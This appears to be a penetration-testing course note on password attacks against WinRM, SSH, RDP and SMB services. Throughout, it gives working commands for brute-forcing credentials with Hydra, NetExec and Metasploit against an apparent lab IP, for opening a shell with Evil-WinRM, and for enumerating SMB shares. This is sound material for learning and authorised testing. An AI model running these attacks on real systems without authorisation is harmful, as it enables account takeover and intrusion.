# Network Services

Network services are essential for remote access and management. Common services include FTP, SMB, NFS, SSH, RDP, WinRM, and LDAP. This guide covers password attack methods for key services.

## WinRM (Windows Remote Management)

WinRM is Microsoft's implementation of WS-Management for remote Windows system management. It operates on TCP ports 5985 (HTTP) and 5986 (HTTPS).

**NetExec** is an effective tool for WinRM password attacks:

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

A successful result shows `(Pwn3d!)`, indicating command execution capability.

**Evil-WinRM** provides interactive shell access:

```bash
sudo gem install evil-winrm
evil-winrm -i 10.129.42.197 -u user -p password
```

## SSH (Secure Shell)

SSH (port 22) uses three security mechanisms: symmetric encryption, asymmetric encryption, and hashing.

Brute force SSH with **Hydra**:

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

Connect using OpenSSH:

```bash
ssh user@10.129.42.197
```

## RDP (Remote Desktop Protocol)

RDP (port 3389) enables remote Windows access with GUI and file sharing capabilities.

Brute force with **Hydra**:

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

Connect with **xFreeRDP**:

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```

## SMB (Server Message Block)

SMB enables file and printer sharing. Common tools: Hydra, Metasploit, NetExec.

**Hydra attack:**

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

**Metasploit approach:**

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

**Enumerate shares with NetExec:**

```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

**Access shares with smbclient:**

```bash
smbclient -U user \\10.129.42.197\SHARENAME
```
